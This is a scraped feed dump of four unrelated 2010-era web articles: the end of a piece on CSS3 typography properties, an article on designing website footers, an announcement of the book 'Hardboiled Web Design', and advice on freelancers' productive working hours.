<code>after-edge</code>.</li></ul><h3>Controlling Overflow</h3><p>The <code>text-overflow</code> property lets you control what is shown when <strong>text overflows its container</strong>. For example, if you want all of the items in a list of news to have the same height, regardless of the amount of text, you can use CSS to add ellipses (…) to the overflow to indicate more text. This technique is commonly seen in iPhone apps and websites.</p><p><a href=\"http://www.nytimes.com/ref/membercenter/iphonefaq.html\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/nyt-app.jpg\" alt=\"Nyt-app in The Future Of CSS Typography\" width=\"320\" height=\"480\"></a><br> <em>The New York Times iPhone app uses an ellipsis for overflowing text.</em></p><p>This property works in the latest versions of Safari and Opera and in IE6 (where the overflowing element should have a set width, such as <code>100%</code>) and IE7. To be able to apply the property to an element, the element has to have <code>overflow</code> set to something other than <code>visible</code> and <code>white-space: nowrap</code>. To make it work in Opera, you need to add the vendor-specific property:</p><pre>li {\n\twhite-space: nowrap;\n\twidth: 100%;\n\toverflow: hidden;\n\t-o-text-overflow: ellipsis;\n\ttext-overflow: ellipsis;\n}</pre><p>In the <a href=\"http://dev.w3.org/csswg/css3-text/#text-overflow\">Editor’s draft of the specification</a>, you can see that other properties related to <code>text-overflow</code> are being considered, such as <code>text-overflow-mode</code> and <code>text-overflow-ellipsis</code>, for which <code>text-overflow</code> would be the shorthand.</p><h3>Alignment And Hyphenation</h3><p>Controlling hyphenation online is tricky. <strong>Many factors need to be considered</strong> when setting automatic hyphenation, such as the fact that different rules apply to different languages. Take Portuguese, in which you can hyphenate a word only at the end of a syllable; for double consonants, the hyphen must be located right in the middle.</p><p>The specification is still being developed, but the proposed properties are:</p><ul><li><code>hyphenate-dictionary</code>;</li><li><code>hyphenate-before</code> and <code>hyphenate-after</code>;</li><li><code>hyphenate-lines</code>;</li><li><code>hyphenate-character</code>.</li></ul><p><a href=\"http://www.w3.org/TR/2007/WD-css3-gcpm-20070205/#hyphenation\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/hyphenation.jpg\" alt=\"Hyphenation in The Future Of CSS Typography\" width=\"600\" height=\"318\"></a><br> <em>Proposed specification for hyphenation on the W3C website.</em></p><p>This is a good example of how the <strong>input of interested Web designers</strong> is vital. Thinking about and testing these properties before they are finalized has nothing to do with being “edgy” or with showing off. By <strong>proposing changes to the specification</strong> and illustrating our comments with examples, we are contributing to a better and stronger spec.</p><p>Another CSS3 property that hasn’t been implemented in most browsers (only IE supports it, and only partially) is <code>text-align-last</code>. If your text is set to <code>justify</code>, you can define how to align the last line of a paragraph or the line right before a forced break. This property takes the following values: <code>start</code>, <code>end</code>, <code>left</code>, <code>right</code>, <code>center</code> and <code>justify</code>.</p><h3>Unicode Range And Language</h3><h4>Unicode Range</h4><p>The <code>unicode-range</code> property lets you define the <strong>range of Unicode characters supported</strong> by a given font, rather than providing the complete range. This can be useful to restrict support for a wide variety of languages or mathematical symbols, and thus reduce bandwidth usage.</p><p>Imagine that you want to include some Japanese characters on your page. Using the <code>font-face</code> rule, you can have multiple declarations for the same <code>font-family</code>, each providing a different font file to download and a different Unicode range (or even overlapping ranges). The browser should only download the ranges needed to render that specific page.</p><p>To see examples of how <code>unicode-range</code> could work, head over to the <a href=\"http://www.w3.org/TR/css3-fonts/#character-range-the-unicode-range-descri\">spec’s draft page</a>.</p><h4>Language</h4><p>Use the <code>:lang</code> pseudo-class to create <strong>language-sensitive typography</strong>. So, you could have one background color for text set in French (<code>fr</code>) and another for text set in German (<code>de</code>):</p><pre>div:lang(fr) {\n\tbackground-color: blue;\n}\n\ndiv:lang(de) {\n\tbackground-color: yellow;\n}</pre><p>You might be wondering why we couldn’t simply use an attribute selector and have something like the following:</p><pre>div[lang|=fr] {\n\tbackground-color: blue;\n}</pre><p>Here, we are targeting all <code>div</code> elements whose <code>lang</code> attribute is or starts with <code>fr</code>, followed by an <code>-</code>. But if we had elements inside that <code>div</code>, they wouldn’t be targeted by this selector because their <code>lang</code> attribute isn’t specified. By using the <code>:lang</code> pseudo-class, the <code>lang</code> attribute is <strong>inherited to all children of the elements</strong> (the whole <code>body</code> element could even be holding the attribute).</p><p>The good news is that all latest versions of the major browsers support this pseudo-class.</p><h3>Conclusion</h3><p>In surveying the examples in this article, you may be <strong>wondering why to bother</strong> with most of them.</p><p>True, the specification is far from being approved, and it could change over time, but now is the time for <strong>experimentation and to contribute</strong> to the final spec.</p><p>Try out these new properties, and think of how they could be improved or how you could implement them to make your life easier in future. <strong>Having examples of implementations</strong> is important to the process of adding a property to the spec and, moreover, of implementing it in browsers.</p><p>You can start with the simple step of subscribing to the <a href=\"http://www.w3.org/blog/CSS\">CSS Working Group blog</a> to keep up to date on the latest developments.</p><p>So, do your bit to improve the lot of future generations of Web designers… and your own!</p><h4>Resources and Interesting Links</h4><ul><li><a href=\"http://dev.w3.org/csswg/css3-text/\">CSS3 Text (Editor’s Draft)</a>, W3C</li><li><a href=\"http://www.w3.org/TR/2007/WD-css3-gcpm-20070205/#hyphenation\">Hyphenation</a>, W3C</li><li><a href=\"http://www.w3.org/TR/css3-fonts/\">CSS3 Fonts</a>, W3C</li><li><a href=\"http://webtypography.net/\">The Elements of Typographic Style Applied to the Web</a></li><li><a href=\"http://www.markboulton.co.uk/journal/comments/five-simple-steps-to-better-typography\">Five Simple Steps to Better Typography</a></li><li><a href=\"http://www.everydayworks.com/?cat=52\">Type Experiments with HTML</a></li><li><a href=\"http://webdesignernotebook.com/css/styling-a-poem-with-advanced-css-selectors/\">Styling a Poem With Advanced CSS Selectors</a></li><li><a href=\"http://www.webdesignerwall.com/trends/css3-examples-and-best-practices/\">CSS3: Examples and Best Practices</a></li></ul><p><em>(al)</em></p><hr><p><small>© Inayaili de Leon for <a href=\"http://www.smashingmagazine.com\">Smashing Magazine</a>, 2010. | <a href=\"http://www.smashingmagazine.com/2010/03/01/css-and-the-future-of-text/\">Permalink</a> | <a href=\"http://www.smashingmagazine.com/2010/03/01/css-and-the-future-of-text/#comments\">56 comments</a> | <a title=\"Bookmark in del.icio.us\" href=\"http://del.icio.us/post?url=http://www.smashingmagazine.com/2010/03/01/css-and-the-future-of-text/&amp;title=The%20Future%20Of%20CSS%20Typography\">Add to del.icio.us</a> | <a title=\"Bookmark in Digg\" href=\"http://digg.com/submit?phase=2&amp;url=http://www.smashingmagazine.com/2010/03/01/css-and-the-future-of-text/\">Digg this</a> | <a title=\"Stumble on StumbleUpon\" href=\"http://www.stumbleupon.com/submit?url=http://www.smashingmagazine.com/2010/03/01/css-and-the-future-of-text/\">Stumble on StumbleUpon!</a> | <a title=\"Tweet us!\" href=\"http://twitter.com/home?status=@tweetmeme%20@smashingmag%20Reading%20&#39;The%20Future%20Of%20CSS%20Typography&#39;%20http://www.smashingmagazine.com/2010/03/01/css-and-the-future-of-text/\">Tweet it!</a> | <a title=\"Bookmark in Reddit\" href=\"http://reddit.com/submit?url=http://www.smashingmagazine.com/2010/03/01/css-and-the-future-of-text/\">Submit to Reddit</a> | <a href=\"http://forum.smashingmagazine.com/\">Forum Smashing Magazine</a><br> Post tags: <a href=\"http://www.smashingmagazine.com/tag/css/\" rel=\"tag\">CSS</a><br> </small></p>"

What happens when people reach the end of a page?</p>\n<p>You can bet that a simple copyright statement won’t hold visitors’ attention, but many pages are designed with the expectation that people will find their way… or so we assume.</p>\n<p>The bottom of a page is not the end of a website. <strong>An informative, compelling</strong> <strong>footer</strong> is the natural place to lead people to more information within the site rather than wandering aimlessly.</p>\n<p>Read more about the trends and innovations that follow page content and answer the unspoken question, <strong>where to from here?</strong></p>\n<p><span></span></p>\n<p>The ongoing problem of how <strong>to hold people’s attention</strong> can be  addressed in many ways: eye-popping graphics, clever use of negative  space, snappy typography and well-written text.</p>\n<p>But all too often people  are left hanging when they scroll to the bottom of the page. Should  they scroll back up? Visit another website? Close the tab?</p>\n<p>Where the body content ends, the footer takes over.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/natural-place.gif\" alt=\"diagram showing how readers&#39; attention naturally wanders to the  footer\"></p>\n<p>The footer is a distinct collection of content that concludes every  page of a website. Typically, it contains a copyright statement, a link  to the home page and either an email link or a link to the contact page.</p>\n<p><strong>Footers almost always span the width of the page</strong>. Beyond this, they  exhibit a variety of styles.</p>\n<p>Even though it doesn’t offer many links, <a href=\"http://www.dishizzle.com/\">Dishizzle</a> makes it hard to miss the  large icons at the bottom of its website. With its search box and  friendly type, this footer is both legible and useful.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/dishizzle.jpg\" alt=\"screenshot of dishizzle&#39;s footer\"></p>\n<p>Compare it to the footer on  \t\t\t<a href=\"http://www.43folders.com/\">43 Folders</a>, which takes the  opposite approach. A handful of concise sentences explains the website’s  purpose, describes its owner and links to its web host. After a  thorough copyright statement, the page ends.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/43folders.jpg\" alt=\"screenshot of the 43 folder&#39;s footer\"></p>\n<p>Sometimes footers merely repeat the navigation bar. It’s a natural  fit: once the reader has read or skimmed the page, they come upon a list  of interesting links to other pages, rather than be left to wander.</p>\n<p>But those links are often just that: bits of clickable text arranged  in a thin, underdeveloped strip. While this may work for websites that  have little content, a serious website isn’t complete without a  well-planned footer.</p>\n<p><strong>A footer is not just an appendage. It’s a good host</strong>.</p>\n<p><br></p>\n<h1>Unsung Stewards</h1>\n<p>The bottom may seem an unlikely place to put vital information, but  footers are ideal real estate for navigation and important features  because visitors naturally move in that direction as they scroll down.</p>\n<p>Like a good host, an elaborate footer presents different kinds of  information that reflect the nature, and content, of the website.</p>\n<p>A footer can play many roles on a website. The trick is deciding  where guests should go when they’re done with a page. A good host lets  their guests enjoy themselves and steps in only when the guests begin to  wonder “What’s next?”</p>\n<h2>Footers as Site Maps</h2>\n<p>While the header presents links to major sections of the website, the  footer can delve into details. Site map-based footers, which are ideal  for websites that store content in many sections and sub-sections,  reflect the scale and concerns of a website.</p>\n<p><a href=\"http://www.whitehouse.gov/\">The White House</a> is a good example. Its footer presents the website as six sections,  each with as few as 6 and as many as 23 links.</p>\n<p>Deliberately simple, the  keyword links can be absorbed at a glance by guests scanning for topics  of interest. Almost as tall as it is wide, the footer is hard to miss,  but its content doesn’t compete with the page above.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/whitehouse-gov.jpg\" alt=\"screenshot of the white house&#39;s footer\"></p>\n<p><br></p>\n<h2>Footers as Advertisements</h2>\n<p>Especially if the website sells something—a product, service or  membership—the footer is a second chance to incite visitors to act. The  end of the page is a great place to remind guests of the benefits of the  product or service being offered. Repeating this same message on every  page drives the point home.</p>\n<p><a href=\"http://www.mailchimp.com/features/\">Mail Chimp</a> takes advantage of this space to repeat its sales pitch: 1) free  templates, 2) a comparison of its service to that of competitors and 3)  flexible pricing.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/mailchimp.jpg\" alt=\"screenshot of mail chimp&#39;s footer\"></p>\n<p><a href=\"http://www.mailchimp.com/features/\">Expression Engine</a> lists some of these things, too, and also links to the help section and  other information that prospective customers would want.</p>\n<p><a href=\"http://expressionengine.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/expression-engine.gif\" alt=\"screenshot of expression engine&#39;s footer\" width=\"615\" height=\"152\"></a></p>\n<p>Unlike plain site maps, footers that advertise must be more  persuasive than informative. They should give guests incentives to buy  and lead to pages that enable them to act.</p>\n<p><br></p>\n<h2>Footers as Character Studies</h2>\n<p>While a personal website would address topics that interest its  owner, the footer could describe the person behind it. Whose website is  this? What is he or she like? What else do they do?</p>\n<p>Few websites do this better than the one of \t\t\t<a href=\"http://jasonsantamaria.com/\"> graphic designer Jason Santa Maria</a>, whose footer could be a page  unto itself.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/jasonsantamaria.jpg\" alt=\"screenshot of the Jason Santa Maria&#39;s footer\"></p>\n<p>Meanwhile, the footer of <a href=\"http://www.zeldman.com/\">standards  expert Jeffery Zeldman’s</a> contains visual—and even  photographic—snippets of projects he is involved with or interested in.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/zeldman.jpg\" alt=\"screenshot of Jeffrey Zeldman&#39;s footer\"></p>\n<p><br></p>\n<h2>Footer as Colophon</h2>\n<p>A footer can contain information about how or why the website was  built. It could:</p>\n<ul>\n<li> <strong>Reiterate the website’s mission or tagline. </strong></li>\n<li><strong> Say which CMS or ISP is being used. </strong></li>\n<li><strong> Declare that the page has valid (X)HTML and CSS and complies with  certain accessibility standards. </strong></li>\n</ul>\n<p><br></p>\n<h1>Variation Based on Context</h1>\n<p>The footer should generally stay consistent throughout the website.  Page-specific information usually isn’t warranted. But complicated  websites can bend the rules.</p>\n<p>The playful icons on  \t\t\t<a href=\"http://www.ibm.com/smarterplanet/\">IBM’s website</a> provide  a friendlier, less corporate way to navigate pages. But these icons  appear only in the “Smarter Planet” section.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/ibm-smarter-planet.jpg\" alt=\"screenshot of the ibm&#39;s smarter planet footer\"></p>\n<p>IBM’s regular footer looks like this:</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/ibm-regular.jpg\" alt=\"screenshot of the ibm&#39;s default footer\"></p>\n<p>Likewise, the links in  \t\t\t<a href=\"http://www.apple.com/mac\">Apple’s site map-based footer</a> varies according to the section it appears in.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/apple-mac.jpg\" alt=\"screenshot of the Apple&#39;s Mac footer\"></p>\n<p>Above, the footer in the Mac section. Below, the one for iPods.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/apple-ipod.jpg\" alt=\"screenshot of the Apple&#39;s iPod footer\"></p>\n<p>None of these roles are exclusive. Elaborate footers can incorporate  site maps, highlights, updates, credentials, search tools and more.  Below, <a href=\"http://www.bustedtees.com/\">BustedTees</a> offers ways  to stay current, browse and submit feedback.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/bustedtees.gif\" alt=\"screenshot of busted tee&#39;s footer\"></p>\n<p>Functional doesn’t always translate into compelling, though. <a href=\"http://www.cnn.com/\">CNN</a>’s footer includes a search tool, local  weather, a site map, legalese and links to its content in other  languages. Useful, but dry. The most interesting visual element is the  red strip.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/cnn.jpg\" alt=\"screenshot of CNN&#39;s footer\"></p>\n<p>Although it fits the tone of the website, CNN’s footer is merely  designed not to compete with the page above.</p>\n<p><br></p>\n<h1>How to Craft a Useful Footer</h1>\n<p>Generally, a web page invites people to act or to learn. After  reading a news article or blog post, people walk away with a new idea or  set of facts. Product pages educate visitors on the items being sold.  Pages with weather information affect how people dress. In each case, a  person has <em>changed</em> somehow by the time they reach the bottom of  the page. And there they find the footer.</p>\n<p>So, the end of the page is a natural place to put two things: tools  by which visitors can act on what they have just learned; and calls to  action.</p>\n<p>Footers have a tough job. People ignore them out of habit; they  instinctively scroll to the top or click away. That’s why good footers  must be designed not as afterthoughts but as if they were pages  themselves.</p>\n<p>Creating a useful footer begins with asking certain questions:</p>\n<ul>\n<li> <strong>What content on my website do I want to emphasize?</strong><br>\n A good footer guides guests to those pages. </li>\n<li> <strong>What else would interest visitors?</strong><br>\n A good footer attracts guests with information they would like.  Visitors who scroll all the way to the bottom were likely engaged by the  page’s content. Links to related information will keep them on the  website. </li>\n<li> <strong>What content would benefit visitors the most?</strong><br>\n Like a good host, its job is to be helpful. The footer rewards  guests for reaching the end of the page with, if possible, freebies or  entertainment or, better yet, frequently requested information. If the  website is for a bricks-and-mortar business, the footer could contain a  simple map to the location. </li>\n<li> <strong>What would epitomize the website’s character and style?</strong><br>\n Like a good conclusion, the footer sums up the nature of the  website: its topic, attitude and theme. In this way, the footer is  similar to the header, which introduces the website to newcomers. </li>\n</ul>\n<p>T-shirt seller <a href=\"http://www.threadless.com/\">Threadless</a> answers many questions in its keyword-rich footer:</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/threadless-diagram.gif\" alt=\"diagram of questions and answers at threadless\"></p>\n<p>Once you’ve decided what to put in your footer, don’t neglect  presentation.</p>\n<ul>\n<li> <strong>Make it big.</strong><br>\n A token footer is thin, just tall enough to admit one line of text.  An attention-grabbing footer is substantial. A rule of thumb is to make  the footer’s height at least a quarter of its width. For example, if the  page is 960 pixels wide, then the footer should be at least 240 pixels  tall. </li>\n<li> <strong>Set it apart.</strong><br>\n Give the footer a distinct boundary, and make sure it spans the  width of the page. Guests should see where the body ends and the footer  begins. </li>\n<li> <strong>Give it style.</strong><br>\n A footer should carry the theme of the website, in style, color  scheme and typography. If possible, it should reuse visual elements from  elsewhere on the website. But it shouldn’t detract from the page’s  content. </li>\n<li> <strong>Make it worthwhile.</strong><br>\n The ideal footer is strong enough to warrant the visitor’s  attention. It offers interesting content to peruse in an attractive  package—like any important page. </li>\n</ul>\n<p><a href=\"http://www.guardian.co.uk/\">The Guardian</a> isn’t afraid to  play up its footer. Eye-catching graphics laid between brand-matching  color bars tell visitors that this is <em>content</em>, not just fine  print.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/guardian-co-uk.gif\" alt=\"screenshot the guardian&#39;s footer\"></p>\n<p><a href=\"http://www.silverbackapp/\">Silverback</a> has few features  in its footer but plenty of style. It offers an easy-to-read experience  that restates the website’s purpose and encourages visitors to receive  updates via its newsletter.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/silverback.gif\" alt=\"screenshot silverback&#39;s footer\"></p>\n<p>While <a href=\"http://www.travelocity.com/\">Travelocity</a> packs 72  links into its footer, a lack of visual hierarchy or clear layout makes  it hard to take seriously. More doesn’t always mean better.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/travelocity.jpg\" alt=\"screenshot travelocity&#39;s footer\"></p>\n<p>All of these criteria may sound like a tall order, but there are two  easy approaches to creating a good footer.</p>\n<p><br></p>\n<h2>Approach #1: Create a Miniature Home Page</h2>\n<p>The easiest way to create a helpful footer is to recap the website’s  purpose and highlights. Look at your home page for inspiration.</p>\n<p>Typically, the home page is a cross between a table of contents and a  news ticker, giving guests an overview of the website and the latest  information.</p>\n<p>A footer need not include <em>every</em> element from the home page.  If the home page showcases 10 best-selling products and the 3 most  recent blog posts, then the footer could highlight the top 5 products  and 1 post, with links to more of each. A smaller version of the  website’s logo would also be appropriate.</p>\n<p>Think of the footer as a table of contents that conveniently appears  when visitors need it most: when they’re wondering what’s next.</p>\n<p><a href=\"http://www.mactalk.com.au/\">MacTalk Australia</a> has a relatively small header, which leaves more room for content and  advertising above the fold. Nearly twice as tall as the header, the  content-rich footer expands on the simple header’s navigation and  introduction by spelling out how much content each category has and  which tags are most popular. Both the header and footer have RSS and  Twitter icons, and the footer includes a newsletter sign-up form—plus  two other RSS and Twitter links just below the copyright statement.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/mactalk-header-footer.jpg\" alt=\"diagram showing common elements in Mac Talk&#39;s header and footer\"></p>\n<p><a href=\"http://www.nytimes.com/\">The New York Times</a> footer includes the latest headlines and photos from various  sections.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/nytimes.jpg\" alt=\"screenshot of the New York Time&#39;s footer\"></p>\n<p><br></p>\n<h2>Approach #2: Provide Supplementary Content</h2>\n<p>Footers can do the opposite of serving as a miniature home page by  offering content not found anywhere else on the website.</p>\n<p>Bits of  supplementary content that can’t fill pages on their own can find a home  in the footer. Unlike the miniature home page, a supplementary footer  can contain links to other websites, as long as they’re informative or  beneficial to the guest.</p>\n<p>But don’t treat the footer as a dumping ground for stuff that doesn’t  fit anywhere else. Like any proper page, a footer should inform,  persuade, entertain or do all three. The key is to find worthwhile  information that supports the website’s overall theme, not any one  particular page.</p>\n<p><a href=\"http://www.komodomedia.com/\">Komodo Media</a>’s \t\t\tfooter includes eye-catching links to what the owner is listening to  on Last.fm.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/komodomedia.jpg\" alt=\"screenshot of the Komodo Media&#39;s footer\"></p>\n<p>Some websites, such as <a href=\"http://www.veer.com/\">Veer</a>, point  to their family of websites. Corporations can promote their brands  simply by cross-linking them to each other.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/veer.gif\" alt=\"screenshot of veer&#39;s footer\"></p>\n<p><br></p>\n<h2>Other Approaches</h2>\n<p>If your website has a substantial sidebar, try rearranging it as a  footer. Although this will change the website’s layout drastically,  moving secondary information to the bottom of the page might remove  distractions from the primary information.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/footers/sidebar-to-footer.gif\" alt=\"diagram showing how to change a sidebar into a footer\"></p>\n<p><br></p>\n<h1>On Your Way</h1>\n<p>The golden rule of footers is <strong>never leave guests to their own  devices</strong>.</p>\n<p>Footers are hosts who present their guests with  options. They are natural stepping stones across the website, enticing  guests to click to other pages—or related websites.</p>\n<p>You can learn a lot about a website’s priorities from the contents of  the footer. What’s in your footer right now? You do have one, right?  Because a website without a footer is worse than an article without an</p>\n<p><br></p>\n<p><em>Written exclusively for Webdesigner Depot by <a href=\"http://benthinkin.net/\">Ben Gremillion</a>.

I could not be more excited.</p>\n\n<p>Working with New Riders over the last four years has been a dream come true. Without them, their patience and their support, <a href=\"http://transcendingcss.com/\">Transcending CSS</a> would never have been written, nor would it have helped my career in the positive ways that it has. I owe them a huge debt of gratitude for everything that they have done for me and I sincerely hope that we will work together in the future.</p>\n\n<p>So why choose a smaller independent?</p>\n\n<p>For a number of reasons.</p>\n\n<p>Hardboiled Web Design will be more than just a CSS book. It will cover so many of the exciting possibilities offered by CSS3 (and HTML5) in ways that I know will be unique and I hope will inspire people to eagerly grab hold of them with both fists.</p>\n\n<p>Design and quality really matters to me. I want everyone who buys the book (in whatever format) to gasp when they see it. So working side-by-side with the team at <a href=\"http://fivesimplesteps.co.uk/\">Five Simple Steps</a> and <a href=\"http://www.markboultondesign.com/\">Mark Boulton Design</a> means that I know that the book’s design will be everything that I imagine it will be.</p>\n\n<p>Being independent, we have the opportunity to control every aspect of design and production from layout and illustration through to printing and packaging. Mark’s Designing For The Web is a perfect example of how being small and focussed can help to create something amazing.</p>\n\n<p>I get to pick the team too. Working with <a href=\"http://twitter.com/markboulton\">Mark</a> and his team will be a privilege, but for me it only gets better. <a href=\"http://twitter.com/maxvoltar\">Tim Van Damme</a>, whose design and technical skills I admire enormously, has agreed to come on board as design and technical reviewer, backed by editor <a href=\"http://twitter.com/chrisdavidmills\">Chris Mills</a>. <a href=\"http://twitter.com/simoncollison\">Simon Collison</a> has kindly agreed to write the introduction, with a foreword by <a href=\"http://twitter.com/zeldman\">Jeffrey Zeldman</a>.</p>\n\n<p>Only a few years ago I couldn’t have imagined that physical, printed books would be only one of many ways that people like to buy and read technical books. That is why Mark and I have decided to publish Hardboiled Web Design as a beautifully bound reference book and in PDF and ePub formats.</p>\n\n<p>Later in the year, we will also be creating a Hardboiled interactive iPad version of the book complete with built in demos and video tutorials. This ability to publish in innovative new formats and to work with a small, focussed team on creating something that no one has done played a huge part in deciding to publish with Five Simple Steps.</p>\n\n<p>It would be dishonest not to mention that there is also a strong financial motive behind the deal. As someone who runs a small business, this deal allows me to spend more time on making Hardboiled Web Design everything that I want it to be. I hope that will be great news for everybody who buys and enjoys the book.</p>\n\n<p>So now it’s back to writing and designing. The <a href=\"http://hardboiledwebdesign.com/\">Hardboiled Web Design</a> site is live (with Easter eggs) and you can keep in touch with its progress and see sneak previews by leaving your details on the site or following <a href=\"http://twitter.com/itshardboiled\">@itshardboiled</a> on Twitter.</p>\n\n<hr>\n<p>Published in <a href=\"http://forabeautifulweb.com/blog/category/news\">News</a>.</p>"

I know at least a dozen extremely successful freelancers whose careers only took off once they discovered the <em>true</em> times they were most productive – and every single one of those freelancers had no idea, up until that point, that they weren’t getting as much out of their workweek as they could.</p>\n<h3><strong>Taking Your Productivity for a Test Drive </strong></h3>\n<p>Those best, most productive hours are different for everyone, unfortunately, so I can’t just suggest you work from 5am to 11am or 4pm to 8pm, for example.</p>\n<p>The hours each of us are most productive have to do with the way our individual brains are wired. Studies show that night owls and morning people have completely different nervous systems. So how do you find out what hours are most productive for you?</p>\n<p>I’m an early riser, myself. Up at 5 am every day. I know a few other people who swear by getting up at dawn, like James. Those hours make us feel good. We enjoy the silence, the slow beginning to the day. We like being at our desks before the rest of the freelancing world has even hit the snooze button once.</p>\n<p>You might be that kind of person. And you may not even know it.</p>\n<p>Others enjoy late night work. There’s no shortage of night owls in the freelancing world, and burning the midnight oil is extremely satisfying for them. They like finishing off a big project in the wee hours and then falling into bed, spent.</p>\n<p>You might enjoy one of those nights too. But you also may not have tried it.</p>\n<p>That’s the problem. We often believe we’re a night owl or a morning person, but in actual fact, we’re just locked into a habit and we’ve fooled ourselves into thinking that we’ve got it right. James used to stay up until 2am every night – for years – doing some good work indeed. That is, until he realized that going to bed at 9pm and getting up at 5pm left him feeling a whole lot better.</p>\n<p>We tend to get set in our patterns and habits, but we’re not 9-to-5ers. Our freelancing careers allow us to get more creative than that. Since you have the freedom, try playing around with your hours. Get up a little earlier every day, or stay up a little later. (Don’t do both at the same time – you’ll burn out.)</p>\n<p>Try out your new time for two weeks or so to adjust. See if you notice any changes, good or bad. Pay attention to when you get the most work done during the day. Often freelancers think they’re hitting a block when they’re actually just hitting a pocket of non-productivity.</p>\n<p>You haven’t lost your touch – you just need a break.</p>\n<p>Start getting up from your desk for an hour every time you get stuck. Do something else, something mindless. Come back in an hour and see if you’re rearing to go.</p>\n<p>Keep a log of those hours over at least a week. If you notice you’re always productive at the same time and completely incapable of working at other times, congratulations: you’ve found your optimal productivity.</p>\n<h3><strong>Leveraging Your Productive Hours </strong></h3>\n<p>Most freelancers exhaust themselves by trying to work through hours when they aren’t productive. Don’t do this. You’ll either wind up mentally exhausted or you’ll distract yourself with procrastination. If you do the former, you’ll be too tired to work at your best times. If you do the latter, you’re liable to go right through your most productive hours without even noticing you’re ready to go again.</p>\n<p>No good.</p>\n<p>Instead, work as hard as you can during your most productive times and stop when you start to feel yourself lagging or getting tired. Use your off hours to give your brain a break. Do some physical activity for awhile – hell, go for a walk. Read for pleasure. Have a chat with a friend. Cook some food.</p>\n<p>Whatever you do, make sure you’re letting your brain completely disengage from the work at hand. Pick an activity that’s mindless and carried out almost automatically without you having to think about it.</p>\n<p>When your productivity window comes back around, sit down and get back to work. Your brain will be rested and you’ll be primed to do some of your best work.</p>\n<p>Be prepared for your productive hours to be scattered all over the day in little bits and chunks. This isn’t just likely – it’s almost guaranteed. Very, very few people can actually work productively for a solid eight-hour block, freelancers or no. Don’t fool yourself that you’re above being human like everyone else.</p>\n<p>The difference is that freelancers have the freedom to step away from their desk and give their brains a break. Feel sorry for the guy in the office cubicle who can’t – he’s wearing out his brain.</p>\n<p>You, on the other hand? You’re flying high in your best productivity zones. Right up until the moment you’re not, and then you get to take a break and wait for your next productive time to come around.</p>\n<p>We knew the freelancer’s life was better, and now we have one more reason why.</p>\n<p><em>About the Author: For more tips on how to get the most out of your freelancing career, head on over to <a href=\"http://menwithpens.ca\">Men with Pens</a>, where Taylor and James give you tricks of the trade to get ahead.</em></p>\n<p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/8ht4n8gk25l2l5maofrf5p08g4/300/250?ca=1&amp;fh=280#http%3A%2F%2Ffreelanceswitch.com%2Fproductivity%2Fare-your-working-hours-jeopardizing-your-productivity%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ZCIocPXf1Z4:hCvtj0mRLmA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ZCIocPXf1Z4:hCvtj0mRLmA:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ZCIocPXf1Z4:hCvtj0mRLmA:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ZCIocPXf1Z4:hCvtj0mRLmA:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ZCIocPXf1Z4:hCvtj0mRLmA:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ZCIocPXf1Z4:hCvtj0mRLmA:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ZCIocPXf1Z4:hCvtj0mRLmA:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ZCIocPXf1Z4:hCvtj0mRLmA:wF9xT3WuBAs\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ZCIocPXf1Z4:hCvtj0mRLmA:wF9xT3WuBAs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=ZCIocPXf1Z4:hCvtj0mRLmA:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=ZCIocPXf1Z4:hCvtj0mRLmA:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/FreelanceSwitch/~4/ZCIocPXf1Z4\" height=\"1\" width=\"1\">"

